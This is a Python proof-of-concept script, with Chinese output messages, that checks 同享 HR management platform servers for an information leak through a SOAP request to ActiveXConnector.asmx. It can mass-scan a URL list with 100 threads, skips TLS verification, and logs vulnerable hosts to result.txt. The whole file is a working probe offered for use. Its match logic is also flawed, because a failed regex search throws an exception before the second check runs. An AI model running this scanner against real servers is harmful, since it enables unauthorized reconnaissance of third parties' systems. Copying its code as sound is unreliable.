import argparse, requests, re, sys
from multiprocessing.dummy import Pool
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

def a():
    text = """
██████╗  ██████╗  ██████╗
██╔══██╗██╔═══██╗██╔════╝
██████╔╝██║   ██║██║     
██╔═══╝ ██║   ██║██║     
██║     ╚██████╔╝╚██████╗
╚═╝      ╚═════╝  ╚═════╝
                                                         
"""
    print(text)

def poc(target):
    payloade = "/Service/ActiveXConnector.asmx"
    data = """<soapenv:envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
   <soapenv:header>
   <soapenv:body>
      <tem:getactivexconnector>
   </tem:getactivexconnector></soapenv:body>
</soapenv:header></soapenv:envelope>"""
   
    try:
        headers = {
            'Content-Type': 'text/xml;charset=UTF-8',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0'
        }
        
        res = requests.post(url=target + payloade, verify=False, data=data, headers=headers, timeout=10)
        if re.search('(Microsoft .NET Framework)',res.text).group(0)=="Microsoft .NET Framework" or re.search('(ASP.NET)',res.text).group(0)=="ASP.NET":
            print(f"[+]{target}存在信息泄露漏洞")
            with open("result.txt", 'a', encoding="utf-8") as f:
                f.write(target + '\n')
        else:
            print(f"[-]{target}不存在此漏洞")
    except Exception as e:
        print(f"[-]{target}请求失败: {str(e)}")

def main():
    a()
    parse = argparse.ArgumentParser(description="同享人力管理管理平台ActiveXConnector.asmx信息泄露")
    parse.add_argument('-u', '--url', type=str, help="please input your link", dest="url")
    parse.add_argument('-f', '--file', type=str, help="please input your file", dest="file")
    args = parse.parse_args()
    
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        urllist = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for i in fp.readlines():
                url = i.strip()
                if url: 
                    urllist.append(url)
        
        mp = Pool(100)
        mp.map(poc, urllist)
        mp.close()  
        mp.join()   
    else:
        print(f"Usage : Python {sys.argv[0]} -h") 

if __name__ == "__main__":
    main()